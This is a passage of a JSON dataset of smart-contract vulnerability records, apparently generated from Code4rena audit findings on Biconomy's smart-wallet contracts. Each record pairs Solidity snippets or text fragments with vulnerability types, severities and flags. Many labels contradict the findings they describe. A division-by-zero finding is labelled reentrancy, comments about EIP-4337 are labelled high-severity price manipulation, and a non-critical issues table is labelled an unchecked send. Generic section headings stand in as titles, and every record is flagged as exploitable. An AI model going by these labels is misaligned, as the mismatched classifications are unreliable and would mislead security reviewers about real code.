    "code": "solidity\nfunction _createSenderIfNeeded(uint256 opIndex, UserOpInfo memory opInfo, bytes calldata initCode) internal {\n\tif (initCode.length != 0) {\n\t\taddress sender = opInfo.mUserOp.sender;\n    \tif (sender.code.length != 0) revert FailedOp(opIndex, address(0), \"AA10 sender already constructed\");\n      \taddress sender1 = senderCreator.createSender{gas: opInfo.mUserOp.verificationGasLimit}(initCode);\n        if (sender1 == address(0)) revert FailedOp(opIndex, address(0), \"AA13 initCode failed or OOG\");\n        if (sender1 != sender) revert FailedOp(opIndex, address(0), \"AA14 initCode must return sender\");\n        if (sender1.code.length == 0) revert FailedOp(opIndex, address(0), \"AA15 initCode must create sender\");\n        address factory = address(bytes20(initCode[0:20]));\n      \temit AccountDeployed(opInfo.userOpHash, sender, factory, opInfo.mUserOp.paymaster);\n\t}\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "**Sender existence** Create the account if it does not yet exist, using the initcode provided in the UserOperation. If the account does not exist, and the initcode is empty, or does not deploy a contract at the \u201csender\u201d address, the call must fail. If we take a look at the [`_createSenderIfNeeded()`]() function, we can see that it's not properly implemented: function _createSenderIfNeeded(uint256 opIndex, UserOpInfo memory opInfo, bytes calldata initCode) internal { if (initCode.length != 0) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.879,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "to prevent replay attacks ... the signature should depend on chainid",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "As specified by the [EIP4337](https://eips.ethereum.org/EIPS/eip-4337) standard `to prevent replay attacks ... the signature should depend on chainid`. In [VerifyingSingletonPaymaster.sol#getHash](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L77-L90) the chainId is missing which means that the same UserOperation can be replayed on a different chain for the same smart contract account if the `verifyingSigner` is the same (and most likely this will be the case).",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.068,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "javascript\nFile: SmartAccount.sol\n\n460:    function execute(address dest, uint value, bytes calldata func) external onlyOwner{\n461:        _requireFromEntryPointOrOwner();\n462:        _call(dest, value, func);\n463:    }\n464:\n465:    function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{\n466:        _requireFromEntryPointOrOwner();\n467:        require(dest.length == func.length, \"wrong array lengths\");\n468:        for (uint i = 0; i < dest.length;) {\n469:            _call(dest[i], 0, func[i]);\n470:            unchecked {\n471:                ++i;\n472:            }\n473:        }\n474:    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Medium",
    "title": "[[M-04] Methods used by EntryPoint has `onlyOwner` modifier](https://github.com/code-423n4/2023-01-biconomy-findings/issues/390)",
    "description": "*Submitted by [immeas](https://github.com/code-423n4/2023-01-biconomy-findings/issues/390), also found by [Kutu](https://github.com/code-423n4/2023-01-biconomy-findings/issues/495), [0xDave](https://github.com/code-423n4/2023-01-biconomy-findings/issues/411), [betweenETHlines](https://github.com/code-423n4/2023-01-biconomy-findings/issues/395), [hansfriese](https://github.com/code-423n4/2023-01-biconomy-findings/issues/389), [wait](https://github.com/code-423n4/2023-01-biconomy-findings/issues/377), [peanuts](https://github.com/code-423n4/2023-01-biconomy-findings/issues/350), [hihen](https://github.com/code-423n4/2023-01-biconomy-findings/issues/332), [prc](https://github.com/code-423n4/2023-01-biconomy-findings/issues/312), [0xbepresent](https://github.com/code-423n4/2023-01-biconomy-findings/issues/106), and [HE1M](https://github.com/code-423n4/2023-01-biconomy-findings/issues/89)* [contracts/smart-contract-wallet/SmartAccount.sol#L460-L461](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L460-L461)<br> [contracts/smart-contract-wallet/SmartAccount.sol#L465-L466](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L465-L466) `execute` and `executeBatch` in `SmartAccount.sol` can only be called by owner, not EntryPoint: File: SmartAccount.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 19,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.628,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "javascript\n56:    /**\n57:     * execute a transaction (called directly from owner, not by entryPoint)\n58:     */\n59:    function execute(address dest, uint256 value, bytes calldata func) external {\n60:        _requireFromEntryPointOrOwner();\n61:        _call(dest, value, func);\n62:    }\n63:\n64:    /**\n65:     * execute a sequence of transaction\n66:     */\n67:    function executeBatch(address[] calldata dest, bytes[] calldata func) external {\n68:        _requireFromEntryPointOrOwner();\n69:        require(dest.length == func.length, \"wrong array lengths\");\n70:        for (uint256 i = 0; i < dest.length; i++) {\n71:            _call(dest[i], 0, func[i]);\n72:        }\n73:    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "Proof of Concept",
    "description": "The reference implementation has both these functions without any onlyOwner modifiers: <https://github.com/eth-infinitism/account-abstraction/blob/develop/contracts/samples/SimpleAccount.sol#L56-L73> 56:    /** 57:     * execute a transaction (called directly from owner, not by entryPoint) 58:     */",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.681,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "isValidSignature(bytes32,bytes)",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "[[M-06] Doesn't Follow ERC1271 Standard](https://github.com/code-423n4/2023-01-biconomy-findings/issues/288)",
    "description": "*Submitted by [Atarpara](https://github.com/code-423n4/2023-01-biconomy-findings/issues/288), also found by [gz627](https://github.com/code-423n4/2023-01-biconomy-findings/issues/370) and [zapaz](https://github.com/code-423n4/2023-01-biconomy-findings/issues/132)* As Per [EIP-1271](https://eips.ethereum.org/EIPS/eip-1271) standard `ERC1271_MAGIC_VAULE` should be `0x1626ba7e` instead of `0x20c13b0b` and function name should be `isValidSignature(bytes32,bytes)` instead of  `isValidSignature(bytes,bytes)`. Due to this, signature verifier contract go fallback function and return unexpected value and never return `ERC1271_MAGIC_VALUE` and always revert `execTransaction` function.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.031,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "// singleton slot always needs to be first declared variable, to ensure that it is at the same location as in the Proxy contract.",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Recommended Mitigation Steps",
    "description": "Add storage gaps to all inherited contracts that contain storage variables. **[livingrockrises (Biconomy) commented](https://github.com/code-423n4/2023-01-biconomy-findings/issues/261#issuecomment-1397357822):** > Regarding storage gaps I want to bring this up. > > SmartAccount first storage is Singleton(first inherited contract)<br>",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.129,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "require(batchId != 0, \"batchId 0 is used only by EntryPoint\")",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Recommended Mitigation Steps",
    "description": "Add a requirement that `batchId` is not `0` in `execTransaction`: `require(batchId != 0, \"batchId 0 is used only by EntryPoint\")` **[livingrockrises (Biconomy) confirmed](https://github.com/code-423n4/2023-01-biconomy-findings/issues/246#issuecomment-1397693932)** ***",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.061,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "| 1 |\n| [N-17] |Use underscores for number literals| 2 |\n| [N-18] |",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Non-Critical Issues List",
    "description": "| Number |Issues Details|Context| |:--:|:-------|:--:| | [N-01]|Insufficient coverage|1| | [N-02] |Unused function parameter and local variable |2| | [N-03] |Initial value check is missing in Set Functions| 3 |",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.067,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  246  \n  247:     function handlePayment(\n  248:         uint256 gasUsed,\n  249:         uint256 baseGas,\n  250:         uint256 gasPrice,\n  251:         uint256 tokenGasPriceFactor,\n  252:         address gasToken,\n  253:         address payable refundReceiver\n  254:     ) private nonReentrant returns (uint256 payment) {\n  255:         // uint256 startGas = gasleft();\n  256:         // solhint-disable-next-line avoid-tx-origin\n  257:         address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n  258:         if (gasToken == address(0)) {\n  259:             // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n  260:             payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n  261:             (bool success,) = receiver.call{value: payment}(\"\");\n  262:             require(success, \"BSA011\");\n  263:         } else {\n  264:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n  265:             require(transferToken(gasToken, receiver, payment), \"BSA012\");\n  266:         }\n  267:         // uint256 requiredGas = startGas - gasleft();\n  268:         //console.log(\"hp %s\", requiredGas);\n  269:     }\n  270: \n  271:     function handlePaymentRevert(\n  272:         uint256 gasUsed,\n  273:         uint256 baseGas,\n  274:         uint256 gasPrice,\n  275:         uint256 tokenGasPriceFactor,\n  276:         address gasToken,\n  277:         address payable refundReceiver\n  278:     ) external returns (uint256 payment) {\n  279:         uint256 startGas = gasleft();\n  280:         // solhint-disable-next-line avoid-tx-origin\n  281:         address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n  282:         if (gasToken == address(0)) {\n  283:             // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n  284:             payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n  285:             (bool success,) = receiver.call{value: payment}(\"\");\n  286:             require(success, \"BSA011\");\n  287:         } else {\n  288:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n  289:             require(transferToken(gasToken, receiver, payment), \"BSA012\");\n  290:         }\n  291:         uint256 requiredGas = startGas - gasleft();\n  292:         //console.log(\"hpr %s\", requiredGas);\n  293:         // Convert response to string and return via error message\n  294:         revert(string(abi.encodePacked(requiredGas)));\n  295:     }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "[L-01] Prevent division by 0",
    "description": "On several locations in the code precautions are not being taken for not dividing by 0, this will revert the code.<br> These functions can be called with 0 value in the input, this value is not checked for being bigger than 0, that means in some scenarios this can potentially trigger a division by zero. [SmartAccount.sol#L247-L295](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L247-L295) 2 results - 1 file contracts/smart-contract-wallet/SmartAccount.sol:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 54,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\ncontracts/smart-contract-wallet/SmartAccountFactory.sol:\n  28       * @param _owner EOA signatory of the wallet\n  29:      * @param _entryPoint AA 4337 entry point address\n  30       * @param _handler fallback handler address\n\n  49       * @param _owner EOA signatory of the wallet\n  50:      * @param _entryPoint AA 4337 entry point address\n  51       * @param _handler fallback handler address\n\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol:\n  1  /**\n  2:  ** Account-Abstraction (EIP-4337) singleton EntryPoint implementation.\n  3   ** Only one instance required on each chain.\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol:\n  1  /**\n  2:  ** Account-Abstraction (EIP-4337) singleton EntryPoint implementation.\n  3   ** Only one instance required on each chain.\n\ncontracts/smart-contract-wallet/aa-4337/samples/DepositPaymaster.sol:\n  21   * paymasterAndData holds the paymaster address followed by the token address to use.\n  22:  * @notice This paymaster will be rejected by the standard rules of EIP4337, as it uses an external oracle.\n  23   * (the standard rules ban accessing data of an external contract)\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "High",
    "title": "[L-02] Use of EIP 4337, which is likely to change, not recommended for general use or application",
    "description": "contracts/smart-contract-wallet/SmartAccountFactory.sol: 28       * @param _owner EOA signatory of the wallet 29:      * @param _entryPoint AA 4337 entry point address 30       * @param _handler fallback handler address 49       * @param _owner EOA signatory of the wallet",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 25,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n\ncontracts/smart-contract-wallet/aa-4337/core/StakeManager.sol:\n  114       */\n  115:     function withdrawTo(address payable withdrawAddress, uint256 withdrawAmount) external {\n  116:         DepositInfo storage info = deposits[msg.sender];\n  117:         require(withdrawAmount <= info.deposit, \"Withdraw amount too large\");\n  118:         info.deposit = uint112(info.deposit - withdrawAmount);\n  119:         emit Withdrawn(msg.sender, withdrawAddress, withdrawAmount);\n  120:         (bool success,) = withdrawAddress.call{value : withdrawAmount}(\"\");\n  121:         require(success, \"failed to withdraw\");\n  122:     }\n  123  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "[L-03] Consider using OpenZeppelin's SafeCast library to prevent unexpected overflows when casting from uint256",
    "description": "contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol: 114       */ 115:     function withdrawTo(address payable withdrawAddress, uint256 withdrawAmount) external { 116:         DepositInfo storage info = deposits[msg.sender]; 117:         require(withdrawAmount <= info.deposit, \"Withdraw amount too large\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.643,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\ncontracts\\smart-contract-wallet\\SmartAccount.sol#l451\n  449     function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n- 451:       (bool success,) = dest.call{value:amount}(\"\");                              \n+            assembly {                                    \n+                success := call(gas(), dest, amount, 0, 0)\n+            }                                             \n+                                                          \n  452            require(success,\"transfer failed\");\n  453       }\n  454\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "[L-04] Gas griefing/theft is possible on unsafe external call",
    "description": "`return` data `(bool success,)` has to be stored due to EVM architecture, if in a usage like below, 'out' and 'outsize' values are given (0,0) . Thus, this storage disappears and may come from external contracts a possible Gas griefing/theft problem is avoided https://twitter.com/pashovkrum/status/1607024043718316032?t=xs30iD6ORWtE2bTTYsCFIQ&s=19 There are 8 instances of the topic. contracts\\smart-contract-wallet\\SmartAccount.sol#l451 449     function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.559,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol:\n  64      */\n  65:     function setSigner( address _newVerifyingSigner) external onlyOwner{\n  66:         require(_newVerifyingSigner != address(0), \"VerifyingPaymaster: new signer can not be zero address\");\n  67:         verifyingSigner = _newVerifyingSigner;\n  68:     }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "[L-05] Front running attacks by the `onlyOwner`",
    "description": "`verifyingSigner` value is not a constant value and can be changed with `setSigner` function, before a function using `verifyingSigner` state variable value in the project, `setSigner` function can be triggered by `onlyOwner` and operations can be blocked contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol: 64      */ 65:     function setSigner( address _newVerifyingSigner) external onlyOwner{ 66:         require(_newVerifyingSigner != address(0), \"VerifyingPaymaster: new signer can not be zero address\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.373,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\n\n14 results - 3 files\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n   72:     // onlyOwner\n   76:     modifier onlyOwner {\n   81:     // onlyOwner OR self\n  449:     function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n  455:     function pullTokens(address token, address dest, uint256 amount) external onlyOwner {\n  460:     function execute(address dest, uint value, bytes calldata func) external onlyOwner{\n  465:     function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{\n  536:     function withdrawDepositTo(address payable withdrawAddress, uint256 amount) public onlyOwner {\n\ncontracts/smart-contract-wallet/paymasters/BasePaymaster.sol:\n  24:     function setEntryPoint(IEntryPoint _entryPoint) public onlyOwner {\n  67:     function withdrawTo(address payable withdrawAddress, uint256 amount) public virtual onlyOwner {\n  75:     function addStake(uint32 unstakeDelaySec) external payable onlyOwner {\n  90:     function unlockStake() external onlyOwner {\n  99:     function withdrawStake(address payable withdrawAddress) external onlyOwner {\n\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol:\n  65:     function setSigner( address _newVerifyingSigner) external onlyOwner{\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "Impact",
    "description": "The `onlyOwner` role has a single point of failure and `onlyOwner` can use critical a few functions. Even if protocol admins/developers are not malicious there is still a chance for Owner keys to be stolen. In such a case, the attacker can cause serious damage to the project due to important functions. In such a case, users who have invested in project will suffer high financial losses. ` onlyOwner ` functions; 14 results - 3 files contracts/smart-contract-wallet/SmartAccount.sol:",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 25,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n\n2 results - 1 file\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  264:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n  288:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "[L-07] Loss of precision due to rounding",
    "description": "Add scalars so roundings are negligible. 2 results - 1 file contracts/smart-contract-wallet/SmartAccount.sol: 264:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor); 288:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.254,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "js\nStorage Gaps\nThis makes the storage layouts incompatible, as explained in Writing Upgradeable Contracts. \nThe size of the __gap array is calculated so that the amount of storage used by a contract \nalways adds up to the same number (in this case 50 storage slots).\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Impact",
    "description": "For upgradeable contracts, inheriting contracts may introduce new variables. In order to be able to add new variables to the upgradeable contract without causing storage collisions, a storage gap should be added to the upgradeable contract. If no storage gap is added, when the upgradable contract introduces new variables, it may override the variables in the inheriting contract. Storage gaps are a convention for reserving storage slots in a base contract, allowing future versions of that contract to use up those slots without affecting the storage layout of child contracts.<br> To create a storage gap, declare a fixed-size array in the base contract with an initial number of slots.<br> This can be an array of uint256 so that each element reserves a 32 byte slot. Use the naming convention `__gap` so that OpenZeppelin Upgrades will recognize the gap:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.268,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n1 result - 1 file\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  109:     function setOwner(address _newOwner) external mixedAuth {\n  110:         require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n  111:         address oldOwner = owner;\n  112:         owner = _newOwner;\n  113:         emit EOAChanged(address(this), oldOwner, _newOwner);\n  114:     }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-10] Use `2StepSetOwner ` instead of ` setOwner `",
    "description": "1 result - 1 file contracts/smart-contract-wallet/SmartAccount.sol: 109:     function setOwner(address _newOwner) external mixedAuth { 110:         require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\"); 111:         address oldOwner = owner;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.409,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  166:     function init(address _owner, address _entryPointAddress, address _handler) public override initializer { \n  167:         require(owner == address(0), \"Already initialized\");\n  168:         require(address(_entryPoint) == address(0), \"Already initialized\");\n  169:         require(_owner != address(0),\"Invalid owner\");\n  170:         require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n  171:         require(_handler != address(0), \"Invalid Entrypoint\");\n  172:         owner = _owner;\n  173:         _entryPoint =  IEntryPoint(payable(_entryPointAddress));\n  174:         if (_handler != address(0)) internalSetFallbackHandler(_handler);\n  175:         setupModules(address(0), bytes(\"\"));\n  176:     }\n\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-11] init() function can be called by anybody",
    "description": "`init()` function can be called anybody when the contract is not initialized. More importantly, if someone else runs this function, they will have full authority because of the `owner` state variable. Here is a definition of `init()` function. contracts/smart-contract-wallet/SmartAccount.sol: 166:     function init(address _owner, address _entryPointAddress, address _handler) public override initializer {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.791,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  192:     function execTransaction(\n  193:         Transaction memory _tx,\n  194:         uint256 batchId,\n  195:         FeeRefund memory refundInfo,\n  196:         bytes memory signatures\n  197:     ) public payable virtual override returns (bool success) {\n  198:         // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4\n  199:         //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\n  200:         uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n  201:         //console.log(\"init %s\", 21000 + msg.data.length * 8);\n  202:         bytes32 txHash;\n  203:         // Use scope here to limit variable lifetime and prevent `stack too deep` errors\n  204:         {\n  205:             bytes memory txHashData =\n  206:                 encodeTransactionData(\n  207:                     // Transaction info\n  208:                     _tx,\n  209:                     // Payment info\n  210:                     refundInfo,\n  211:                     // Signature info\n  212:                     nonces[batchId]\n  213:                 );\n  214:             // Increase nonce and execute transaction.\n  215:             // Default space aka batchId is 0\n  216:             nonces[batchId]++;\n  217:             txHash = keccak256(txHashData);\n  218:             checkSignatures(txHash, txHashData, signatures);\n  219:         }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[L-12] The minimum transaction value of 21,000 gas may change in the future",
    "description": "Any transaction has a 'base fee' of 21,000 gas in order to cover the cost of an elliptic curve operation that recovers the sender address from the signature, as well as the disk space of storing the transaction, according to the Ethereum White Paper. contracts/smart-contract-wallet/SmartAccount.sol: 192:     function execTransaction( 193:         Transaction memory _tx, 194:         uint256 batchId,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 31,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  108  \n  109:     function setOwner(address _newOwner) external mixedAuth {\n  110:         require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n  111:         address oldOwner = owner;\n  112:         owner = _newOwner;\n  113:         emit EOAChanged(address(this), oldOwner, _newOwner);\n  114:     }\n  115 \n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "[N-06] Add a timelock to critical functions",
    "description": "It is a good practice to give time for users to react and adjust to critical changes. A timelock provides more guarantees and reduces the level of trust required, thus decreasing risk for users. It also indicates that the project is legitimate (less risk of a malicious owner making a sandwich attack on a user). Consider adding a timelock to: contracts/smart-contract-wallet/SmartAccount.sol: 108 109:     function setOwner(address _newOwner) external mixedAuth {",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.405,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "only import what you need",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Description",
